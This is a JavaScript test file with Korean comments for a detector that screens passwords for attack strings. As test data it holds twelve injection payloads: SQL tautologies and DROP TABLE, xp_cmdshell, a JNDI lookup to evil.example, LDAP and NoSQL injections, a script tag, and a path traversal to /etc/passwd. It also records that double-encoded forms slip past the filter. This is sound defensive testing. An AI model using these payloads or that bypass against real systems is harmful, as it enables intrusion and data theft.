/**
 * 공격 문자열 탐지 검증.
 *
 * 두 방향을 **똑같이 중요하게** 본다.
 *   ① 요구된 페이로드 12종을 전부 잡는가
 *   ② 정상 비밀번호를 하나도 오탐하지 않는가  ← 차단 목록의 진짜 위험은 이쪽이다
 */
import { describe, it, expect } from 'vitest'
import {
  detectAttackPattern, hasAttackPattern, decodeVariants, ATTACK_PATTERNS, SCAN_LIMIT
} from './attackPatterns.js'

/** 요구된 12종. 문자열 이스케이프가 값을 바꾸지 않도록 주의해서 적었다. */
const PAYLOADS = [
  ["' OR '1'='1' -- padding", 'sqlTautology'],
  ["'; DROP TABLE users; --", 'sqlKeyword'],
  ['" OR ""="" padding', 'sqlTautology'],
  ["1' UNION SELECT NULL,NULL--", 'sqlKeyword'],
  ['${jndi:ldap://evil.example/a}', 'jndiLookup'],
  ['{"$ne": null} padding', 'nosqlOperator'],
  ['*)(uid=*))(|(uid=*', 'ldapFilter'],
  ['<script>alert(1)</script>', 'htmlScript'],
  ['../../../../etc/passwd', 'pathTraversal'],
  ["'; EXEC xp_cmdshell('dir');--", 'sqlKeyword'],
  ['%27%20OR%201%3D1%20--', 'sqlTautology'],
  [String.raw`\x27 OR 1=1 -- padding`, 'sqlTautology']
]

/**
 * 오탐이 나면 안 되는 값들.
 * 영어 문장·하이픈·퍼센트·따옴표·경로처럼 **평범한 비밀번호에 실제로 나오는** 형태를 모았다.
 */
const LEGIT = [
  'sunset over the quiet oreum',
  'walking slowly along the shore',
  'correct-horse-battery-staple!!!!',
  'Correct-Horse-Battery-2026!!!!',
  'the quiet road that runs along the western shore of the island',
  'salt and pepper and olive oil',
  'I select the blue one from three',   // select … from 만으로는 걸지 않는다
  'my password is 100% secure!',        // 깨진 퍼센트 인코딩
  'Bank-Of-Jeju--2026',                 // 글자 사이의 `--`
  '2 * 3 = 6 and 4 * 5 = 20',           // and … = … 인데 항등식이 아니다
  'coffee & books on a rainy day',
  '$150 for the whole trip',
  'she said "hello" and left',
  "O'Brian's little red boat",
  'a/b/c/d/e/f/g/h/i/j/k/l',
  '한라산 백록담 새벽 산행 2026',
  'update my settings please',
  'delete the old photos now',
  'insert the key and turn it',
  'drop me a line tomorrow',
  '<3 <3 <3 forever and ever',
  'C:\\Users\\PC\\Desktop\\jeju',
  '50%off everything today!!',
  'x=1; y=2; z=3; done here',
  '90% and 10% is 100% total',
  'the-quick-brown-fox-jumps'
]

describe('요구된 공격 페이로드 12종', () => {
  it('전부 탐지한다', () => {
    for (const [payload] of PAYLOADS) {
      expect(hasAttackPattern(payload), payload).toBe(true)
    }
  })

  it('어느 규칙에 걸렸는지 짚어준다', () => {
    for (const [payload, key] of PAYLOADS) {
      expect(detectAttackPattern(payload).key, payload).toBe(key)
    }
  })

  it('사용자에게 보여줄 한글 이름이 붙어 있다', () => {
    for (const [payload] of PAYLOADS) {
      expect(detectAttackPattern(payload).label, payload).toBeTruthy()
    }
  })
})

describe('오탐 (차단 목록의 진짜 비용)', () => {
  it('정상 비밀번호를 하나도 막지 않는다', () => {
    const hits = LEGIT
      .map(v => [v, detectAttackPattern(v)])
      .filter(([, r]) => r.hit)
      .map(([v, r]) => `${r.key}: ${JSON.stringify(v)}`)
    expect(hits).toEqual([])
  })

  it('개별 특수문자 하나만으로는 절대 막지 않는다', () => {
    // 인젝션 방어를 문자 차단으로 흉내내지 않는다는 것을 고정한다
    for (const ch of ['\'', '"', ';', '`', '<', '>', '$', '{', '}', '*', '|', '&', '-', '\\', '%', '#', '(', ')']) {
      const pw = `quiet lantern ${ch} morning road`
      expect(hasAttackPattern(pw), JSON.stringify(pw)).toBe(false)
    }
  })
})

describe('인코딩 우회', () => {
  it('퍼센트 인코딩을 한 겹 벗겨서 본다', () => {
    expect(decodeVariants('%27%20OR%201%3D1')).toContain("' OR 1=1")
  })

  it('소스코드식 이스케이프를 벗겨서 본다', () => {
    expect(decodeVariants(String.raw`\x27 OR 1=1`)).toContain("' OR 1=1")
  })

  it('HTML 엔티티를 벗겨서 본다', () => {
    expect(decodeVariants('&#39; OR 1=1')).toContain("' OR 1=1")
    expect(hasAttackPattern('&#x27; OR &#x27;1&#x27;=&#x27;1')).toBe(true)
  })

  it('깨진 퍼센트 인코딩에서 예외를 던지지 않는다', () => {
    // decodeURIComponent('50%off') 는 URIError 를 던진다 → 폴백 경로를 타야 한다
    expect(() => decodeVariants('50%off 100%')).not.toThrow()
    expect(hasAttackPattern('50%off 100%')).toBe(false)
  })

  it('⚠️ 다중 인코딩은 잡지 못한다 — 실측으로 확인한 한계다', () => {
    // 한 겹만 벗긴다.
    expect(hasAttackPattern("'%20OR%201%3D1%20--")).toBe(true)     // 1겹 → 잡힌다
    expect(hasAttackPattern("'%2520OR%25201%253D1%2520--")).toBe(false)   // 2겹 → 놓친다

    // 다만 따옴표까지 인코딩된 형태는 2겹이어도 걸린다 —
    // 한 겹 벗긴 결과에 `%27` 이 남아 encodedQuote 표지에 걸리기 때문이다.
    // 의도한 설계가 아니라 부수 효과다. 3겹이면 이것도 놓친다.
    expect(detectAttackPattern('%2527%2520OR%25201%253D1%2520--').key).toBe('encodedQuote')
    expect(hasAttackPattern('%252527%252520OR%2525201%25253D1%252520--')).toBe(false)
  })
})

describe('ReDoS 내성', () => {
  it('긴 악성 입력에도 즉시 끝난다', () => {
    const evil = 'a'.repeat(SCAN_LIMIT * 4) + "' or '"
    const t0 = Date.now()
    for (let i = 0; i < 500; i++) detectAttackPattern(evil)
    const ms = Date.now() - t0
    expect(ms, `500회 ${ms}ms`).toBeLessThan(300)
  })

  it('SCAN_LIMIT 로 입력을 먼저 잘라낸다', () => {
    expect(decodeVariants('a'.repeat(SCAN_LIMIT * 3))[0].length).toBe(SCAN_LIMIT)
  })
})

describe('패턴표 자체', () => {
  it('중첩 수량자 `(x+)+` 가 없다 — ReDoS 회귀 방지', () => {
    for (const p of ATTACK_PATTERNS) {
      expect(/\([^)]*[+*]\)[+*]/.test(p.re.source), `${p.key}: ${p.re.source}`).toBe(false)
    }
  })

  it('모든 규칙에 key 와 한글 label 이 있다', () => {
    for (const p of ATTACK_PATTERNS) {
      expect(p.key).toMatch(/^[a-zA-Z]+$/)
      expect(p.label.length).toBeGreaterThan(0)
    }
  })

  it('빈 값·null 에서 터지지 않는다', () => {
    for (const v of ['', null, undefined, 0, {}]) {
      expect(() => detectAttackPattern(v)).not.toThrow()
    }
  })
})
